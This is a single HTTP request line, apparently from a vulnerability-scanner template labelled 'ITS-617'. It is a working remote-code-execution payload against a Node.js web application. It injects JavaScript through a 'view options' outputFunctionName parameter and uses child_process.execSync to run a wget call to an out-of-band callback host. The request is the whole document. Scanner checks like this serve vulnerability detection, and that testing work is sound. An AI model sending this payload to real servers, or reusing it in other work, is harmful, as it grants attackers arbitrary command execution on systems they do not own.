# Vulnerable: ITS-617
GET /page?id={{randstr}}&settings[view%20options][outputFunctionName]=x;process.mainModule.require(%27child_process%27).execSync(%27wget+http://{{interactsh-url}}%27);s
